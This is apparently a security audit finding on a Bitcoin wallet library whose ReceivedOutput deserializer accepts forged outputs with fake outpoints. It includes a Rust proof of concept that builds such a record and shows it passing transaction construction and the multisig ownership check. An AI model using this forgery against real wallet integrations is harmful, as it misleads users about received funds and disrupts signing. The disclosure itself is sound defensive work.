### Title
Unauthenticated `ReceivedOutput` deserialization fabricates unspendable Bitcoin inputs - (File: networks/bitcoin/src/wallet/mod.rs)

### Summary
`ReceivedOutput::read` deserializes an attacker-controlled scalar offset, `TxOut`, and `OutPoint` without proving that the outpoint exists, is unspent, or was produced by `Scanner` for the relevant wallet key. [1](#0-0)  Downstream transaction construction treats the decoded amount as wallet-controlled input value. [2](#0-1) 

### Finding Description
`ReceivedOutput` represents an output discovered by `Scanner`, which normally creates it only after matching an actual transaction output’s `script_pubkey` and recording the real transaction ID and output index. [3](#0-2)  The public deserializer bypasses that provenance check and directly accepts all three fields from untrusted bytes. [1](#0-0) 

`SignableTransaction::new` sums the claimed output values as available inputs and later preserves the claimed outputs as Taproot prevouts. [2](#0-1) [4](#0-3)  During multisignature setup, the only ownership check is that each supplied prevout script equals `keys.offset(offset).group_key()` encoded as P2TR; no UTXO existence or scanner-registration check occurs. [5](#0-4) 

An unprivileged party who knows the wallet’s public P2TR script can therefore serialize `offset = 0`, a fabricated `TxOut` paying to that script, and a nonexistent `OutPoint`. The result is indistinguishable from a scanner-produced `ReceivedOutput` but describes funds that cannot be spent.

### Impact Explanation
A wallet or service that accepts serialized `ReceivedOutput` records from an untrusted peer, cache, or message can report Bitcoin funds as received even though no corresponding UTXO exists. It may then construct and threshold-sign a transaction whose prevout or amount is invalid, causing the signed transaction to be rejected by the Bitcoin network.

The strongest validated impact is fabricated, unspendable received funds rather than theft of existing wallet funds.

### Likelihood Explanation
The input is only public data: the victim’s P2TR script/address and an arbitrary serialized `ReceivedOutput`. Exploitation requires an integration to deserialize attacker-supplied received-output records instead of independently obtaining them from `Scanner` and verified chain data.

### Recommendation
Do not treat `ReceivedOutput::read` as validating received funds. Require deserialized records to be re-validated against a transaction, block, or trusted UTXO source before balance accounting or signing. Consider separating the parsed representation from a scanner-authenticated type, authenticating persisted scan results, and storing the scanner/wallet identity with each output so records cannot be replayed across wallets.

### Proof of Concept
```rust
use bitcoin::{
  consensus::Encodable,
  hashes::Hash,
  Amount, OutPoint, Transaction, TxOut, Txid,
};
use k256::Scalar;

// keys is the tweaked wallet ThresholdKeys whose group key has even Y.
let spend_script = p2tr_script_buf(keys.group_key()).unwrap();

let mut serialized = Scalar::ZERO.to_bytes().to_vec();

TxOut {
  value: Amount::from_sat(1_000_000),
  script_pubkey: spend_script,
}
.consensus_encode(&mut serialized)
.unwrap();

OutPoint {
  txid: Txid::all_zeros(),
  vout: 0,
}
.consensus_encode(&mut serialized)
.unwrap();

// Accepted as a syntactically valid received output despite the fake outpoint.
let forged = ReceivedOutput::read(&mut serialized.as_slice()).unwrap();
assert_eq!(forged.value(), 1_000_000);

// The fabricated output is counted as an input and passes the script ownership check.
let signable = SignableTransaction::new(
  vec![forged],
  &[],
  Some(change_script),
  None,
  1,
).unwrap();
assert!(signable.multisig(&keys).is_some());
```

### Citations

**File:** networks/bitcoin/src/wallet/mod.rs (L120-133)
```rust
  /// Read a ReceivedOutput from a generic satisfying Read.
  #[cfg(feature = "std")]
  pub fn read<R: Read>(r: &mut R) -> io::Result<ReceivedOutput> {
    let offset = Secp256k1::read_F(r)?;
    let output;
    let outpoint;
    {
      let mut buf_r = BufReader::with_capacity(0, r);
      output =
        TxOut::consensus_decode(&mut buf_r).map_err(|_| io::Error::other("invalid TxOut"))?;
      outpoint =
        OutPoint::consensus_decode(&mut buf_r).map_err(|_| io::Error::other("invalid OutPoint"))?;
    }
    Ok(ReceivedOutput { offset, output, outpoint })
```

**File:** networks/bitcoin/src/wallet/mod.rs (L198-210)
```rust
  /// Scan a transaction.
  pub fn scan_transaction(&self, tx: &Transaction) -> Vec<ReceivedOutput> {
    let mut res = Vec::new();
    for (vout, output) in tx.output.iter().enumerate() {
      // If the vout index exceeds 2**32, stop scanning outputs
      let Ok(vout) = u32::try_from(vout) else { break };

      if let Some(offset) = self.scripts.get(&output.script_pubkey) {
        res.push(ReceivedOutput {
          offset: *offset,
          output: output.clone(),
          outpoint: OutPoint::new(tx.compute_txid(), vout),
        });
```

**File:** networks/bitcoin/src/wallet/send.rs (L175-181)
```rust
    let input_sat = inputs.iter().map(|input| input.output.value.to_sat()).sum::<u64>();
    let offsets = inputs.iter().map(|input| input.offset).collect();
    let tx_ins = inputs
      .iter()
      .map(|input| TxIn {
        previous_output: input.outpoint,
        script_sig: ScriptBuf::new(),
```

**File:** networks/bitcoin/src/wallet/send.rs (L245-254)
```rust
    Ok(SignableTransaction {
      tx: Transaction {
        version: Version(2),
        lock_time: LockTime::ZERO,
        input: tx_ins,
        output: tx_outs,
      },
      offsets,
      prevouts: inputs.drain(..).map(|input| input.output).collect(),
      needed_fee,
```

**File:** networks/bitcoin/src/wallet/send.rs (L273-281)
```rust
  pub fn multisig(self, keys: &ThresholdKeys<Secp256k1>) -> Option<TransactionMachine> {
    let mut sigs = vec![];
    for i in 0 .. self.tx.input.len() {
      let offset = keys.clone().offset(self.offsets[i]);
      if p2tr_script_buf(offset.group_key())? != self.prevouts[i].script_pubkey {
        None?;
      }

      sigs.push(AlgorithmMachine::new(Schnorr::new(), keys.clone().offset(self.offsets[i])));
```
